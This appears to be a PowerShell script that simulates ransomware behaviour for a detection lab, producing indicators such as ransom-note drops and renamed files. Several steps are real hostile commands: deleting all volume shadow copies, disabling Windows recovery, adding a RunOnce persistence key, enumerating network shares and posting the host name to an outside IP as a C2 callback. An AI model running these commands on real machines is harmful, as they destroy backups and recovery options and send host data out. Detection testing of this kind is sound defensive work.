$ErrorActionPreference = 'SilentlyContinue'
$SimDir = "C:\Windows\Temp\ransom_sim"
New-Item -ItemType Directory -Path $SimDir -Force | Out-Null
Write-Host "[*] IOC 1: Deleting volume shadow copies..."
vssadmin delete shadows /all /quiet 2>$null
wmic shadowcopy delete 2>$null
Write-Host "[*] IOC 2: Disabling Windows recovery..."
bcdedit /set {default} recoveryenabled No 2>$null
bcdedit /set {default} bootstatuspolicy ignoreallfailures 2>$null
Write-Host "[*] IOC 3: Mass file creation and rename with ransom extension..."
1..20 | ForEach-Object {
    $f = "$SimDir\document_$_.txt"
    "Sensitive data record $_" | Out-File $f
    Rename-Item $f "$f.ENCRYPTED" -Force
}
Write-Host "[*] IOC 4: Writing registry persistence key..."
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce" -Name "SystemUpdate" -Value "C:\Windows\Temp\ransom_sim\decrypt.exe" -Force | Out-Null
Write-Host "[*] IOC 5: Dropping ransom note..."
"YOUR FILES HAVE BEEN ENCRYPTED. This is a simulation for TrendAI lab purposes only." | Out-File "$SimDir\README_DECRYPT.txt"
Write-Host "[*] IOC 6: Enumerating network shares for lateral spread recon..."
net view /all 2>$null
Get-SmbShare 2>$null
Write-Host "[*] IOC 7: Simulating C2 callback..."
Invoke-WebRequest -Uri "http://185.220.101.1/ransom-checkin" -Method POST -Body "host=$env:COMPUTERNAME&id=LABSIM001" -TimeoutSec 5 2>$null
Write-Host "[+] Ransomware behavior simulation complete."
